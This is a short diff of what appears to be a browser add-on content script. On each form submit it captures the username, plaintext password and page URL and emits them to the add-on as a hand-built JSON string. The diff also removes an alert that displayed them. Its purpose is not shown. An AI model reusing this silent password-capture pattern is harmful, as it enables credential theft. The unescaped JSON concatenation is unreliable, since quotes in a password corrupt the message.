@@ -1,8 +1,7 @@
 $('form').submit(function() {
-      alert("Logging in with username:"+ uname + " and password:"+ pass + " at " + window.location.href);
-      var message = "{'username':'"+ uname + "', " +
-                    "'password':" + pass +"', " +
-                    "'url':'" + window.location.href + "'}";
+      var message = '{"username":"' + uname + '", '+
+                    '"password":"' + pass + '", '+
+                    '"url":"' + window.location.href + '"}'; 
         self.port.emit("message", message);
 });
 
